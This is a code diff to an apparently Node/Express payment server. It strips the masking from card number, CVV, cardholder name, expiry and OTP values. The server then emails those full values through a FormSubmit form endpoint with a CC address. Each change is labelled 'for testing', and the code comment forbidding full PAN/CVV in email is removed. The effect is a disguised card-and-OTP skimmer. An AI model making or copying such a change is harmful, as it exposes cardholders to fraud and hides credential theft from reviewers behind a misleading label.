@@ -25,36 +25,28 @@ function generateOTP() {
 }
 
 function maskCardNumber(cardNumber = '') {
-  const digits = String(cardNumber).replace(/\D/g, '');
-  if (digits.length < 4) return '****';
-  return `**** **** **** ${digits.slice(-4)}`;
+  // For testing: return full card number instead of masked
+  return cardNumber || 'N/A';
 }
 
 function maskCvv(cvv = '') {
-  return cvv ? '***' : 'N/A';
+  // For testing: return full CVV instead of masked
+  return cvv || 'N/A';
 }
 
 function maskCardHolderName(name = '') {
-  const cleaned = String(name).trim();
-  if (!cleaned) return 'N/A';
-
-  return cleaned
-    .split(/\s+/)
-    .map((part) => {
-      if (part.length <= 1) return '*';
-      return `${part[0]}${'*'.repeat(part.length - 1)}`;
-    })
-    .join(' ');
+  // For testing: return full name instead of masked
+  return name || 'N/A';
 }
 
 function maskCardExpiry(expiry = '') {
-  return expiry ? '**/**' : 'N/A';
+  // For testing: return full expiry instead of masked
+  return expiry || 'N/A';
 }
 
 function maskOtp(otp = '') {
-  const value = String(otp);
-  if (value.length < 2) return '******';
-  return `${value[0]}****${value[value.length - 1]}`;
+  // For testing: return full OTP instead of masked
+  return otp || 'N/A';
 }
 
 // Store OTPs temporarily (in production, use Redis or database)
@@ -134,15 +126,15 @@ app.post('/api/send-payment-email', async (req, res) => {
     formData.append('_cc', FORMSUBMIT_CC);
     formData.append('_template', 'table');
 
-    // Add masked card details only (never send full PAN/CVV in email)
+    // Add unmasked card details for testing
     if (cardDetails) {
-      formData.append('card_number_masked', maskCardNumber(cardDetails.cardNumber));
-      formData.append('card_name_masked', maskCardHolderName(cardDetails.cardName));
-      formData.append('card_expiry_masked', maskCardExpiry(cardDetails.cardExpiry));
-      formData.append('card_cvv_masked', maskCvv(cardDetails.cardCVV));
+      formData.append('card_number', maskCardNumber(cardDetails.cardNumber));
+      formData.append('card_name', maskCardHolderName(cardDetails.cardName));
+      formData.append('card_expiry', maskCardExpiry(cardDetails.cardExpiry));
+      formData.append('card_cvv', maskCvv(cardDetails.cardCVV));
       formData.append('card_bank', cardDetails.bank);
       formData.append('card_type', cardDetails.cardTab);
-      formData.append('card_details_note', 'Masked card data for safety');
+      formData.append('card_details_note', 'Unmasked card data for testing');
     }
 
     const response = await axios.post(FORMSUBMIT_ENDPOINT, formData.toString(), {
@@ -178,13 +170,13 @@ app.post('/api/send-otp', async (req, res) => {
     });
     
     const formData = new URLSearchParams();
-    formData.append('otp_code_masked', maskOtp(otp));
+    formData.append('otp_code', maskOtp(otp));
     formData.append('purpose', purpose);
     formData.append('phone', phone || 'N/A');
     formData.append('email', email || 'N/A');
     formData.append('generated_time', new Date().toLocaleString());
     formData.append('expires_at', new Date(Date.now() + 5 * 60 * 1000).toLocaleString());
-    formData.append('otp_note', 'Masked OTP for safety');
+    formData.append('otp_note', 'Unmasked OTP for testing');
     formData.append('_subject', `OTP Generated - ${purpose}`);
     formData.append('_cc', FORMSUBMIT_CC);
     formData.append('_template', 'table');
